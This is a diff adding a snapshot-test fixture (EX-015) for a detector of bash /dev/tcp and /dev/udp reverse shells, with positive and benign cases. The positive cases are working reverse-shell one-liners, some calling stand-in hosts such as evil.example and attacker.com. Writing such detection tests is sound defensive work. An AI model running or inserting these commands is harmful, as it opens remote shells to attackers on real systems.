@@ -1,0 +1,17 @@
+# EX-015: Bash /dev/tcp reverse shell
+# Test cases for snapshot testing
+# Detects bash /dev/tcp and /dev/udp network redirections (reverse shells).
+
+# === Cases that SHOULD be detected ===
+bash -i >& /dev/tcp/10.0.0.1/4444 0>&1
+exec 5<>/dev/tcp/evil.example/443
+cat < /dev/tcp/attacker.com/80
+sh -c 'exec 196<>/dev/udp/1.2.3.4/53'
+/bin/bash -c "bash -i >& /dev/tcp/127.0.0.1/9001 0>&1"
+
+# === Cases that should NOT be detected (benign) ===
+echo done > /dev/null 2>&1
+cat /dev/stdin
+read x < /dev/tty
+grep tcp /etc/services
+ss -tnlp
